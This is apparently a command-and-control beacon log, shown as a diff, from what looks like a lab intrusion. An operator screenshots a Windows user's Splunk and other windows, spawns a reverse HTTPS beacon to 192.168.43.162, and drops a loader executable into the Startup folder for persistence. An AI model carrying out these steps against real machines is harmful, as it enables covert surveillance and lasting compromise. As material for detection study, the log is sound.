@@ -1,0 +1,207 @@
+01/08 08:37:13 UTC [metadata] 192.168.43.216 <- 192.168.43.216; computer: DESKTOP-B0D0J2Q; user: ANH KHOA; process: mspaint.exe; pid: 1548; os: Windows; version: 10.0; build: 19045; beacon arch: x64 (x64)
+01/08 08:37:11 UTC [input] <neo> sleep 10
+01/08 08:37:11 UTC [task] <T1029> Tasked beacon to sleep for 10s
+01/08 08:37:27 UTC [input] <neo> ls
+01/08 08:37:27 UTC [task] <> Tasked beacon to list files in .
+01/08 08:38:05 UTC [checkin] host called home, sent: 35 bytes
+01/08 08:38:05 UTC [output]
+C:\Users\ADMIN\AppData\Local\Temp\RarSFX8\*
+D	0	01/08/2023 15:36:04	.
+D	0	01/08/2023 15:36:04	..
+F	954368	01/08/2023 15:27:25	a.exe
+F	11898	01/06/2023 08:35:50	Test.docx
+
+
+01/08 08:38:47 UTC [input] <neo> screenwatch 5
+01/08 08:38:47 UTC [task] <T1113, T1093> Tasked beacon to take periodic screenshots
+01/08 08:38:55 UTC [checkin] host called home, sent: 199780 bytes
+01/08 08:38:56 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (151kb)
+
+01/08 08:39:06 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (171kb)
+
+01/08 08:39:16 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (152kb)
+
+01/08 08:39:27 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (239kb)
+
+01/08 08:39:37 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (151kb)
+
+01/08 08:39:47 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (151kb)
+
+01/08 08:39:57 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (151kb)
+
+01/08 08:39:59 UTC [task] <> Tasked beacon to list files in . (from File Browser)
+01/08 08:40:07 UTC [checkin] host called home, sent: 19 bytes
+01/08 08:40:35 UTC [input] <neo> spawn my
+01/08 08:40:35 UTC [task] <T1093> Tasked beacon to spawn (x64) windows/beacon_https/reverse_https (192.168.43.162:443)
+01/08 08:40:37 UTC [checkin] host called home, sent: 277000 bytes
+01/08 08:40:37 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (151kb)
+
+01/08 08:40:47 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (139kb)
+
+01/08 08:40:57 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (139kb)
+
+01/08 08:41:08 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (176kb)
+
+01/08 08:41:18 UTC [output]
+received screenshot of Note - Work - Obsidian v1.1.9 from ANH KHOA (134kb)
+
+01/08 08:41:28 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (111kb)
+
+01/08 08:41:38 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (182kb)
+
+01/08 08:41:45 UTC [task] <> Tasked beacon to list files in C:\Users\ (from File Browser)
+01/08 08:41:46 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\ (from File Browser)
+01/08 08:41:48 UTC [checkin] host called home, sent: 58 bytes
+01/08 08:41:48 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (159kb)
+
+01/08 08:41:55 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\ (from File Browser)
+01/08 08:41:58 UTC [checkin] host called home, sent: 40 bytes
+01/08 08:41:58 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (174kb)
+
+01/08 08:41:59 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\Roaming\ (from File Browser)
+01/08 08:42:08 UTC [checkin] host called home, sent: 48 bytes
+01/08 08:42:08 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (201kb)
+
+01/08 08:42:17 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\Roaming\Microsoft\ (from File Browser)
+01/08 08:42:18 UTC [checkin] host called home, sent: 58 bytes
+01/08 08:42:18 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (165kb)
+
+01/08 08:42:22 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\ (from File Browser)
+01/08 08:42:28 UTC [checkin] host called home, sent: 66 bytes
+01/08 08:42:28 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (165kb)
+
+01/08 08:42:30 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\Start Menu\ (from File Browser)
+01/08 08:42:38 UTC [checkin] host called home, sent: 77 bytes
+01/08 08:42:48 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ (from File Browser)
+01/08 08:42:48 UTC [checkin] host called home, sent: 86 bytes
+01/08 08:42:51 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Solar-PuTTY\ (from File Browser)
+01/08 08:42:52 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ (from File Browser)
+01/08 08:42:58 UTC [checkin] host called home, sent: 192 bytes
+01/08 08:43:04 UTC [input] <neo> upload /home/kali/Desktop/Shhhloader/a.exe (C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.exe)
+01/08 08:43:05 UTC [task] <> Tasked beacon to upload /home/kali/Desktop/Shhhloader/a.exe as C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.exe
+01/08 08:43:05 UTC [indicator] file: 5e54f1cd479cbe206708d916df154af8 954368 bytes C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\a.exe
+01/08 08:43:05 UTC [task] <> Tasked beacon to list files in C:\Users\ADMIN\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ (from File Browser)
+01/08 08:43:08 UTC [checkin] host called home, sent: 954650 bytes
+01/08 08:43:29 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (165kb)
+
+01/08 08:43:49 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (165kb)
+
+01/08 08:43:59 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (165kb)
+
+01/08 08:44:09 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (172kb)
+
+01/08 08:44:19 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (165kb)
+
+01/08 08:44:29 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (165kb)
+
+01/08 08:44:40 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (165kb)
+
+01/08 08:45:10 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (165kb)
+
+01/08 08:45:20 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (165kb)
+
+01/08 08:45:30 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (165kb)
+
+01/08 08:46:50 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (165kb)
+
+01/08 08:47:00 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (165kb)
+
+01/08 08:47:10 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (165kb)
+
+01/08 08:47:20 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (169kb)
+
+01/08 08:47:31 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (169kb)
+
+01/08 08:47:51 UTC [output]
+received screenshot of Search | Splunk 9.0.2 - Sidekick from ANH KHOA (169kb)
+
+01/08 08:48:01 UTC [output]
+received screenshot of File Explorer from ANH KHOA (104kb)
+
+01/08 08:48:11 UTC [output]
+received screenshot of Program Files from ANH KHOA (137kb)
+
+01/08 08:48:21 UTC [output]
+received screenshot of SplunkUniversalForwarder from ANH KHOA (127kb)
+
+01/08 08:48:31 UTC [output]
+received screenshot of inputs - Notepad from ANH KHOA (113kb)
+
+01/08 08:48:41 UTC [output]
+received screenshot of inputs - Notepad from ANH KHOA (124kb)
+
+01/08 08:51:42 UTC [output]
+received screenshot of inputs - Notepad from ANH KHOA (124kb)
+
+01/08 08:54:42 UTC [output]
+received screenshot of inputs - Notepad from ANH KHOA (124kb)
+
+01/08 08:57:42 UTC [output]
+received screenshot of inputs - Notepad from ANH KHOA (124kb)
+
+01/08 09:00:43 UTC [output]
+received screenshot of inputs - Notepad from ANH KHOA (124kb)
+
+01/08 09:02:23 UTC [output]
+received screenshot of inputs - Notepad from ANH KHOA (123kb)
+
+01/08 09:02:33 UTC [output]
+received screenshot of local from ANH KHOA (100kb)
+
+01/08 09:02:43 UTC [output]
+received screenshot from ANH KHOA (99kb)
+
+01/08 09:02:54 UTC [output]
+received screenshot of local from ANH KHOA (101kb)
+
+01/08 09:03:04 UTC [output]
+received screenshot of Downloads from ANH KHOA (159kb)
+
+01/08 09:03:14 UTC [output]
+received screenshot of Final-Report - PowerPoint from ANH KHOA (114kb)
+
+01/08 09:03:24 UTC [output]
+received screenshot of Report final from ANH KHOA (113kb)
+
+01/08 09:06:24 UTC [output]
+received screenshot of "Application Launcher For Drive (by Google)" added from ANH KHOA (72kb)
+
+01/08 09:09:25 UTC [output]
+received screenshot of "Application Launcher For Drive (by Google)" added from ANH KHOA (72kb)
+
+01/08 09:12:25 UTC [output]
+received screenshot of "Application Launcher For Drive (by Google)" added from ANH KHOA (72kb)
+
